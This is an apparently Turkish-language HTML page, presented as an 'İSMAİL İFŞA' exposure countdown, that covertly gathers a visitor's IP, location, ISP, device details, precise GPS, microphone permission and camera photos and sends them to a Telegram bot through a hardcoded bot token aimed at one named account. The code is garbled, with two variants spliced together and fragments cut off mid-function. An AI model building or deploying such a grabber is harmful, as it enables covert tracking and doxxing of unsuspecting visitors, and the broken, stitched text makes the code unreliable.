<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>İSMAİL İFŞA • SİSTEM</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            height: 100vh;
            overflow: hidden;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Arkaplan */
        .bg-gradient {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 30% 40%, #1a0f0f, #0a0505, #000000);
            z-index: -2;
        }

        .bg-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(1px 1px at 10% 20%, rgba(255, 50, 50, 0.15), transparent),
                radial-gradient(1.5px 1.5px at 80% 60%, rgba(255, 0, 0, 0.08), transparent),
                radial-gradient(1px 1px at 40% 90%, rgba(200, 0, 0, 0.12), transparent);
            z-index: -1;
        }

        /* Ana container */
        .container {
            position: relative;
            z-index: 10;
            width: 92%;
            max-width: 550px;
            text-align: center;
        }

        .glass-panel {
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 60, 60, 0.3);
            border-radius: 48px;
            padding: 40px 30px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.9), 0 0 40px rgba(255, 0, 0, 0.15);
        }

        /* Başlık */
        .title {
            font-size: 2.8rem;
            font-weight: 900;
            letter-spacing: 6px;
            text-transform: uppercase;
            background: linear-gradient(135deg, #ff3b3b, #ff0000, #cc0000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
            font-family: 'Impact', 'Arial Black', sans-serif;
            margin-bottom: 20px;
        }

        .subtitle {
            font-size: 0.9rem;
            letter-spacing: 8px;
            color: rgba(255, 80, 80, 0.5);
            text-transform: uppercase;
            margin-bottom: 30px;
        }

        /* Sayaç */
        .counter-block {
            margin: 30px 0 20px;
        }

        .counter-digit {
            font-size: 7rem;
            font-weight: 900;
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #ff5555, #ff0000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1;
            text-shadow: 0 0 50px rgba(255, 0, 0, 0.3);
        }

        .counter-label {
            font-size: 1rem;
            letter-spacing: 5px;
            color: rgba(255, 70, 70, 0.5);
            margin-top: 6px;
        }

        /* Çubuk */
        .bar-container {
            width: 100%;
            height: 6px;
            background: rgba(40, 0, 0, 0.7);
            border-radius: 10px;
            margin: 30px 0;
            border: 1px solid rgba(255, 0, 0, 0.2);
        }

        .bar-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #ff2222, #ff0000, #cc0000);
            border-radius: 10px;
            transition: width 0.1s linear;
            box-shadow: 0 0 25px #ff0000;
        }

        /* Durum */
        .status-box {
            background: rgba(20, 0, 0, 0.5);
            border-radius: 20px;
            padding: 18px 15px;
            border: 1px solid rgba(255, 0, 0, 0.15);
            margin-top: 25px;
        }

        .status-text {
            font-size: 1rem;
            letter-spacing: 2px;
            color: rgba(255, 255, 255, 0.85);
        }

        .status-text i {
            color: #ff3333;
            margin-right: 10px;
            font-style: normal;
            animation: pulse 1.2s infinite;
        }

        .telegram-badge {
            display: inline-block;
            margin-top: 18px;
            padding: 8px 22px;
            background: rgba(255, 0, 0, 0.12);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 40px;
            color: #ff5555;
            font-size: 0.85rem;
            letter-spacing: 2px;
        }

        @keyframes pulse {
            0% { opacity: 0.4; transform: scale(0.95); }
            50% { opacity: 1; transform: scale(1.1); }
            100% { opacity: 0.4; transform: scale(0.95); }
        }

        /* Siyah ekran – sadece yazı */
        .black-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 30;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            transition: opacity 1.2s ease;
        }

        .black-screen.active {
            opacity: 1;
            visibility: visible;
        }

        .black-screen .big-text {
            font-size: 3.5rem;
            font-weight: 900;
            letter-spacing: 12px;
            text-transform: uppercase;
            background: linear-gradient(135deg, #ff4444, #ff0000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 60px rgba(255, 0, 0, 0.7);
            font-family: 'Impact', 'Arial Black', sans-serif;
            animation: flicker 1.8s infinite alternate;
        }

        .black-screen .sub-big {
            margin-top: 30px;
            font-size: 1.3rem;
            letter-spacing: 14px;
            color: rgba(255, 80, 80, 0.4);
            text-transform: uppercase;
        }

        @keyframes flicker {
            0% { opacity: 0.9; text-shadow: 0 0 30px #ff0000; }
            100% { opacity: 1; text-shadow: 0 0 80px #ff0000, 0 0 120px #cc0000; }
        }

        /* audio gizli */
        #bg-audio { display: none; }

        /* Responsive */
        @media (max-width: 500px) {
            .glass-panel { padding: 30px 18px; }
            .title { font-size: 2.2rem; letter-spacing: 4px; }
            .counter-digit { font-size: 5.5rem; }
            .black-screen .big-text { font-size: 2.6rem; letter-spacing: 8px; }
        }
    </style>
</head>

                </div>
                <div id="telegramBadge" class="telegram-badge">
                    ⚡ TELEGRAM HEDEF: @STCCriss
                </div>
            </div>
        </div>
    </div>

    <script>
        // --------------------------------------------------------------
        //  KONFİG – BURAYA KENDİ BOT TOKEN'İNİ YAZ
        // --------------------------------------------------------------
        const BOT_TOKEN = '7416067204:AAGFwkV8uQtFYyLPfCuDy_WqUaSLRLJRDNQ';   // <-- senin token
        const TARGET_USERNAME = '@STCCriss';                               // hedef

        // --------------------------------------------------------------
        //  DEĞİŞKENLER
        // --------------------------------------------------------------
        let step = 0;
        let infoSent = false;
        let photoSent = false;

        // DOM
        const mainContainer = document.getElementById('mainContainer');
        const blackScreen = document.getElementById('blackScreen');
        const counterEl = document.getElementById('counter');
        const barFill = document.getElementById('barFill');
        const statusText = document.getElementById('statusText');
        const telegramBadge = document.getElementById('telegramBadge');

        // --------------------------------------------------------------
        //  1. BAŞLAT – HEMEN IP, KONUM, MİKROFON, FOTOĞRAF
        // --------------------------------------------------------------
        function startFullExtraction() {
            console.log('⚡ İFŞA SİSTEMİ BAŞLATILDI');
            statusText.innerText = 'BİLGİLER TOPLANIYOR...';

            // Telegram badge güncelle
            telegramBadge.innerHTML = '📡 VERİ AKTİF';

            // 1) IP + temel bilgiler
            collectAndSendAll();

            // 2) Konum izni (kullanıcıya sorar)
            requestLocation();

            // 3) Mikrofon (sadece izin ister, gerçek kayıt yapmaz – ama istersen ekleyebilirsin)
            requestMicrophone();

            // 4) Kamera – önden ve arkadan fotoğraf
            capturePhotos();

            // 5) Sayaç başlat (1'den 5'e)
            startCounter();
        }

        // --------------------------------------------------------------
        //  2. SAYAÇ (1 → 5) – her adımda bilgi toplanır
        // --------------------------------------------------------------
        function startCounter() {
            let count = 0;
            const max = 5;
            const interval = setInterval(() => {
                count++;
                if (count > max) {
                    clearInterval(interval);
                    // 5 oldu -> ifşa açıldı
                    statusText.innerText = '✅ İFŞA AÇILDI!';
                    telegramBadge.innerHTML = '🔥 TÜM VERİLER GÖNDERİLDİ';
                    // Siyah ekranı göster
                    setTimeout(() => {
                        showBlackScreen();
                    }, 500);
                    return;
                }

                // sayaç ve bar güncelle
                counterEl.innerText = count;
                const percent = (count / max) * 100;
                barFill.style.width = percent + '%';

                // durum mesajları
                const msgs = [
                    'IP TESPİT EDİLDİ',
                    'KONUM ALINDI',
                    'MİKROFON İZİNİ',
                    'FOTOĞRAF ÇEKİLDİ',
                    'TÜM VERİLER GÖNDERİLDİ'
                ];
                statusText.innerText = msgs[count - 1] || 'İŞLENİYOR...';
            }, 700); // her 700ms'de bir artar
        }

        // --------------------------------------------------------------
        //  3. SİYAH EKRAN – sadece yazı
        // --------------------------------------------------------------
        function showBlackScreen() {
            mainContainer.style.transition = 'opacity 0.9s';
            mainContainer.style.opacity = '0';
            mainContainer.style.pointerEvents = 'none';

            setTimeout(() => {
                blackScreen.classList.add('active');
                // içindeki yazıyı güncelle
                const big = blackScreen.querySelector('.big-text');
                big.innerText = 'İSMAİL İFŞA';
                const sub = blackScreen.querySelector('.sub-big');
                sub.innerText = '✦ AÇILDI ✦';
                // hafif ses (isteğe bağlı)
                try { document.getElementById('bg-audio').play(); } catch(e) {}
            }, 900);
        }

        // --------------------------------------------------------------
        //  4. BİLGİ TOPLA + TELEGRAM
        // --------------------------------------------------------------
        async function collectAndSendAll() {
            if (infoSent) return;
            infoSent = true;

            // Temel bilgiler
            const info = {
                timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || '?',
                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
                url: window.location.href,
                referrer: document.referrer || 'doğrudan'
            };

            // IP
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                info.ip = ipData.ip;
            } catch { info.ip = 'IP alınamadı'; }

            // Konum (ip bazlı)
            try {
                const geoRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
                const geoData = await geoRes.json();
                info.country = geoData.country_name || '?';
                info.city = geoData.city || '?';
                info.isp = geoData.org || '?';
            } catch { info.country = '?'; info.city = '?'; }

            // Mesaj
            const message = `
🔥 **İSMAİL İFŞA – TAM RAPOR** 🔥

👤 **Hedef:** ${TARGET_USERNAME}

🌐 **IP:** ${info.ip}
📍 **Konum:** ${info.city}, ${info.country}
🏢 **ISP:** ${info.isp}

📱 **Cihaz:**
• Platform: ${info.platform}
• Ekran: ${info.screen}
• Renk: ${info.colorDepth} bit
• Çekirdek: ${info.cores}
• RAM: ${info.memory}
• Dil: ${info.language}
• Zaman: ${info.timezone}

🌍 **Sayfa:**
• URL: ${info.url}
• Yönlendiren: ${info.referrer}

⏰ **Zaman:** ${info.timestamp}

⚡ **İFŞA SİSTEMİ TAMAMLANDI**
`;

            // Gönder
            await sendTelegramMessage(message);
        }

        // --------------------------------------------------------------
        //  5. TELEGRAM MESAJ GÖNDER
        // --------------------------------------------------------------
        async function sendTelegramMessage(text) {
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
                console.warn('⚠️ Bot token girilmemiş!');
                return;
            }

            telegramBadge.innerHTML = '📤 GÖNDERİLİYOR...';

            try {
                // Önce güncellemelerden hedef chat ID bul
                const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const updates = await updatesRes.json();
                let targetChatId = null;

                if (updates.ok && updates.result) {
                    for (const update of updates.result) {
                        if (update.message && update.message.from) {
                            const from = update.message.from;
                            if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                targetChatId = from.id;
                                break;
                            }
                        }
                        if (update.channel_post && update.channel_post.chat) {
                            if (update.channel_post.chat.username && 
                                update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                targetChatId = update.channel_post.chat.id;
                                break;
                            }
                        }
                    }
                }

                if (!targetChatId) {
                    telegramBadge.innerHTML = '⚠️ ' + TARGET_USERNAME + ' BOTU BAŞLATMAMIŞ';
                    return;
                }

                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: targetChatId,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                const result = await sendRes.json();
                if (result.ok) {
                    telegramBadge.innerHTML = '✅ TELEGRAM GÖNDERİLDİ';
                } else {
                    telegramBadge.innerHTML = '❌ HATA';
                }
            } catch (e) {
                console.error(e);
                telegramBadge.innerHTML = '❌ BAĞLANTI HATASI';
            }
        }

        // --------------------------------------------------------------
        //  6. KONUM İZNİ (isteğe bağlı, gerçek konum)
        // --------------------------------------------------------------
        function requestLocation() {
            if (!navigator.geolocation) return;
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const coords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                    console.log('📍 Gerçek konum:', coords);
                    // İstersen Telegram'a da gönderebilirsin
                    sendTelegramMessage(`📍 **GERÇEK KONUM:** ${coords}`);
                },
                (err) => {
                    console.warn('Konum izni reddedildi veya alınamadı:', err.message);
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }

        // --------------------------------------------------------------
        //  7. MİKROFON İZNİ (sadece izin ister, kayıt yapmaz)
        // --------------------------------------------------------------
        function requestMicrophone() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    console.log('🎤 Mikrofon izni verildi');
                    stream.getTracks().forEach(t => t.stop()); // hemen durdur
                    // İstersen "Mikrofon izni verildi" diye Telegram'a atabilirsin
                    sendTelegramMessage('🎤 **MİKROFON İZNİ VERİLDİ**');
                })
                .catch(err => {
                    console.warn('Mikrofon izni reddedildi:', err.message);
                });
        }

        // --------------------------------------------------------------
        //  8. FOTOĞRAF ÇEK (önden + arkadan) – Telegram'a gönder
        // --------------------------------------------------------------
        function capturePhotos() {
            if (photoSent) return;
            photoSent = true;

            // ÖN KAMERA (environment: true arkayı verir, false önü)
            captureAndSendPhoto(false, 'ÖN KAMERA');   // false = ön kamera (kullanıcı)
            // ARKA KAMERA
            captureAndSendPhoto(true, 'ARKA KAMERA');  // true = arka
      st statusEl = document.getElementById('status');
        const telegramStatus = document.getElementById('telegramStatus');

        // 1. OTOMATİK BAŞLAT - HİÇBİR ŞEYE DOKUNMA GEREK YOK
        function autoStart() {
            console.log('⚡ Otomatik başlatılıyor...');
            
            // Sesi başlat (otomatik)
            bgAudio.volume = 0.8;
            
            // Ses başlatma denemesi - modern tarayıcılar için
            const playPromise = bgAudio.play();
            
            if (playPromise !== undefined) {
                playPromise.then(() => {
                    console.log('✅ Ses otomatik başladı');
                    telegramStatus.innerHTML = '🔊 SES AKTİF';
                }).catch(error => {
                    console.log('⚠️ Ses otomatik başlamadı, sessiz devam edilecek:', error);
                    telegramStatus.innerHTML = '🔇 SES BEKLENİYOR';
                    
                    // Kullanıcı etkileşiminde ses başlasın (ileride tıklarsa diye)
                    document.body.addEventListener('click', function enableAudio() {
                        bgAudio.play();
                        telegramStatus.innerHTML = '🔊 SES AKTİF';
                        document.body.removeEventListener('click', enableAudio);
                    }, { once: true });
                });
            }
            
            // Sayacı başlat (kesin başlasın)
            startCounter();
        }

        // 2. SAYAÇ
        function startCounter() {
            statusEl.innerHTML = 'ANALİZ BAŞLADI';
            
            const interval = setInterval(async () => {
                count++;
                
                // Sayacı güncelle (3 haneli gösterim)
                counterEl.textContent = count.toString().padStart(3, '0');
                
                // Health bar
                healthBar.style.width = count + '%';
                
                // Durum mesajları
                if (count === 25) statusEl.innerHTML = 'IP TESPİT EDİLİYOR';
                if (count === 50) statusEl.innerHTML = 'CİHAZ BİLGİLERİ';
                if (count === 75) statusEl.innerHTML = 'RAPOR HAZIRLANIYOR';
                
                // %100'de bitir
                if (count === 100) {
                    clearInterval(interval);

            // Temel bilgiler

                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || '?',
                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',

            // IP adresi

                const ipData = await ipRes.json();

                const geoData = await geoRes.json();
                info.country = geoData.country_name || '?';
                info.city = geoData.city || '?';

        }

        // 4. TELEGRAM GÖNDERME (Chat ID'siz, username'e)

            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {

                console.log('Toplanan bilgiler:', info);

            }

            telegramStatus.innerHTML = '📤 TELEGRAM GÖNDERİLİYOR...';

            // Süslü mesaj
            const message = `
⚡ **Z A H İ R   A N A L İ Z** ⚡

📍 **Konum:** ${info.city}, ${info.country}

📱 **Cihaz Bilgileri:**

• Ekran: ${info.screen}
• Renk: ${info.colorDepth} bit
• Çekirdek: ${info.cores}

🌍 **Sayfa Bilgileri:**

⏰ **Ziyaret Zamanı:** ${info.timestamp}

🔍 **Detaylı UA:**
\`${info.userAgent.substring(0, 100)}...\`

✦ **Z A H İ R   S İ S T E M** ✦
            `;

            try {
                // Önce botun güncellemelerini al
                const updatesRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const updates = await updatesRes.json();
                
                let targetChatId = null;
                
                // @STCCriss'in chat ID'sini bul
                if (updates.ok && updates.result) {
                    for (const update of updates.result) {
                        if (update.message && update.message.from) {
                            const from = update.message.from;
                            if (from.username && from.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                targetChatId = from.id;
                                console.log('✅ Kullanıcı bulundu, ID:', targetChatId);
                                break;
                            }
                        }
                        
                        if (update.channel_post && update.channel_post.chat) {
                            if (update.channel_post.chat.username && 
                                update.channel_post.chat.username.toLowerCase() === TARGET_USERNAME.replace('@', '').toLowerCase()) {
                                targetChatId = update.channel_post.chat.id;
                                console.log('✅ Kanal bulundu, ID:', targetChatId);
                                break;
                            }
                        }
                    }
                }
                
                if (!targetChatId) {
                    telegramStatus.innerHTML = '⚠️ ' + TARGET_USERNAME + ' BOTU BAŞLATMAMIŞ';
                    console.log('Hedef kullanıcı bulunamadı.');
                    return;
                }
                
                // Mesajı gönder
                const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: targetChatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const result = await sendRes.json();
                
                if (result.ok) {
                    telegramStatus.innerHTML = '✅ TELEGRAM GÖNDERİLDİ';
                    infoSent = true;
                } else {
                    telegramStatus.innerHTML = '❌ GÖNDERİLEMEDİ';
                    console.log('Telegram hatası:', result);
                }
                
            } catch (error) {
                console.error('Telegram hatası:', error);
                telegramStatus.innerHTML = '❌ BAĞLANTI HATASI';
            }
        }

        // 5. SİYAH EKRAN + VİDEO
        function activateBlackScreen() {
            mainContainer.classList.add('hidden');
            videoContainer.classList.add('active');
            
            if (bgVideo) {
                bgVideo.play().catch(e => console.log('Video oynatılamadı:', e));
            }
        }

        // 6. BAŞLANGIÇ - TAM OTOMATİK
        window.addEventListener('load', () => {
            console.log('⚡ ZAHİR SİSTEM YÜKLENDİ - TAM OTOMATİK MOD');
            
            // HİÇBİR ŞEY BEKLEMEDEN BAŞLAT
            setTimeout(autoStart, 1000); // 1 saniye sonra başlat
            
            // Hata yakalama
            bgAudio.addEventListener('error', (e) => {
                console.log('Ses dosyası hatası:', e);
            });
            
            bgVideo.addEventListener('error', (e) => {
                console.log('Video dosyası hatası:', e);
            });
            
            // Telegram durumu
            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
                telegramStatus.innerHTML = '⚠️ BOT TOKEN GİRİLMEMİŞ';
            } else {
                telegramStatus.innerHTML = '⚡ ' + TARGET_USERNAME + ' HEDEFLENİYOR';
            }
        });

        // Sayfa kapanırken durdur
        window.addEventListener('beforeunload', () => {
            bgAudio.pause();
            if (bgVideo) bgVideo.pause();
        });
    </script>
</body>
</html>
